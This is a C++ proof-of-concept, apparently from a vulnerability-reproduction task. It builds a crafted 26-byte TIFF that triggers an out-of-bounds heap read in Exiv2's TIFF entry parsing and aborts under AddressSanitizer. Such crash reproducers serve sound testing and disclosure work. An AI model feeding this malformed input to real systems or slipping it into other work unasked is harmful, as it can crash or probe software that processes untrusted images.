/*
 * Proof-of-concept for an out-of-bounds read (CWE-125) in Exiv2's TIFF
 * reader, reachable through the public API with an in-contract (malformed)
 * TIFF image supplied as an in-memory buffer.
 *
 * The crafted file contains a single IFD0 entry whose data-offset field
 * points just past the end of the buffer with a declared size greater than
 * four bytes. On the resulting tree the two bounds checks in
 * TiffReader::readTiffEntry() that should reject this offset both fail
 * (size_t underflow), so Value::read() copies 64 bytes starting one byte
 * past the end of the heap allocation.
 *
 * Built with -fsanitize=address this aborts (SIGABRT) with a
 * heap-buffer-overflow READ. On the original maintenance batch the entry is
 * truncated and no out-of-bounds access occurs.
 *
 * Compile (as C++, Exiv2 only ships C++ headers):
 *   clang++ -fsanitize=address pocs/probe.c -lexiv2 -o probe
 */
#include <exiv2/exiv2.hpp>

#include <cstdlib>
#include <cstring>

int main(void) {
  /* Minimal little-endian TIFF: one IFD0 entry.
   *   tag   = 0x9999 (handled by the generic entry factory for IFD0)
   *   type  = 7 (UNDEFINED, 1 byte per component)
   *   count = 64         -> declared size 64 (> 4, so stored out-of-line)
   *   value = 27         -> data offset, one byte past the 26-byte buffer
   */
  static const unsigned char tiff[] = {
      0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, /* "II", 42, IFD0 @ 8 */
      0x01, 0x00,                                     /* entry count = 1    */
      0x99, 0x99,                                     /* tag   = 0x9999     */
      0x07, 0x00,                                     /* type  = UNDEFINED  */
      0x40, 0x00, 0x00, 0x00,                         /* count = 64         */
      0x1B, 0x00, 0x00, 0x00,                         /* offset = 27        */
      0x00, 0x00, 0x00, 0x00,                         /* next IFD = 0       */
  };
  const size_t len = sizeof(tiff);

  /* Exact-size heap allocation so the sanitizer guards the end precisely.
   * ImageFactory::open(const byte*, size_t) references this buffer directly. */
  unsigned char* buf = static_cast<unsigned char*>(std::malloc(len));
  if (!buf)
    return 2;
  std::memcpy(buf, tiff, len);

  try {
    auto image = Exiv2::ImageFactory::open(buf, len);
    image->readMetadata();
  } catch (const Exiv2::Error&) {
    /* A clean error return is fine; the memory-safety fault aborts under ASan. */
  }

  std::free(buf);
  return 0;
}
